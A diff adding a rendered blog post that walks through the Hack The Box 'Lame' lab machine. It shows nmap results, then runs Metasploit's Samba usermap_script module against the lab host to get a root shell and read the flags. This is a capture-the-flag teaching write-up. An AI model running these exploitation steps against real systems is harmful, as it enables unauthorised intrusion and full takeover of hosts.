@@ -1,0 +1,129 @@
+I"�<p>Lame was the first box released in Hack The Box (HTB). It’s a good box to start with for anyone new to penetration testing since it’s a relatively easy and gets you familiar with using Metasploit.</p>
+
+<h2 id="hack-the-box">Hack The Box</h2>
+
+<ul>
+  <li>Operating System: Linux</li>
+  <li>Difficulty: Easy</li>
+</ul>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>As always, let’s start with enumeration by using nmap. I like to use:</p>
+
+<p><img src="/images/blog/lame/ipaddress.jpg" alt="nmap scan" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre>PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.35
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Taking a look at the results, the most interesting ports are port 139 and 445 since they are SMB ports, and SMB is a common internet file system that is known to have vulnerabilities. We can also see that they are both currently running <i>Samba smbd 3.X - 4.X</i>, so we can take a look in Metasploit to see if we can find any exploits.</p>
+
+<p>To access Metasploit, we can enter in Terminal:</p>
+
+<p><code class="language-plaintext highlighter-rouge">msfconsole</code></p>
+
+<p>It takes a few minutes for Metasploit to open. Once it opens, we can search for an exploit that is related to Samba by using Metasploit’s search feature:</p>
+
+<p><code class="language-plaintext highlighter-rouge">search samba</code></p>
+
+<p>From the search results, this one looks promising:</p>
+
+<p><img src="/images/blog/lame/exploit.jpg" alt="exploit" /></p>
+
+<p>And based on the description, it says:</p>
+
+<p><i>This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default “username map script” configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</i></p>
+
+<p>So let’s try using it!</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>To use an exploit, we can type in Metasploit:</p>
+
+<p><code class="language-plaintext highlighter-rouge">use exploit/multi/samba/usermap_script</code></p>
+
+<p><img src="/images/blog/lame/metasploit.jpg" alt="using metasploit" /></p>
+
+<p>Now we need to configure the exploit so we can use it to attack the machine.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">options</code>: Gives us the visibility on what options we have to configure the exploit.</li>
+  <li><code class="language-plaintext highlighter-rouge">set rhosts 10.10.10.3</code>: This would be the victim’s IP address.</li>
+  <li><code class="language-plaintext highlighter-rouge">show targets</code>: This is where we select the target’s type (e.g. OS) that we’re exploiting.</li>
+  <li><code class="language-plaintext highlighter-rouge">exploit</code>: Running the exploit.</li>
+</ul>
+
+<p>That worked! We now have access to the machine.</p>
+
+<p>We can type <code class="language-plaintext highlighter-rouge">shell</code> to see if we can gain shell access.</p>
+
+<p><img src="/images/blog/lame/shell.jpg" alt="obtaining a shell" /></p>
+
+<p>Once we have shell access, we can type in:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">whoami</code>: Tells us the type of privileges that we have. It looks like we have root access–perfect.</li>
+  <li><code class="language-plaintext highlighter-rouge">pwd</code>: In other words, print working directory. We can see that we’re in the /root folder.</li>
+</ul>
+
+<p>Since we have root access, we can locate both the root.txt and user.txt file to win the game. Remember to <code class="language-plaintext highlighter-rouge">cat</code> the file once you find it so you can read the contents and enter the flag into HTB.</p>
+
+<p>Congratulations! We now have root access to the box Lame.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Leaving network ports open in general is a huge security risk, especially if there are no controls implemented to keep it secure. When it came to the HTB Lame, we found out that the SMB port was running a version of Samba that was vulnerable to an exploit that allowed us to gain system access.</p>
+:ET
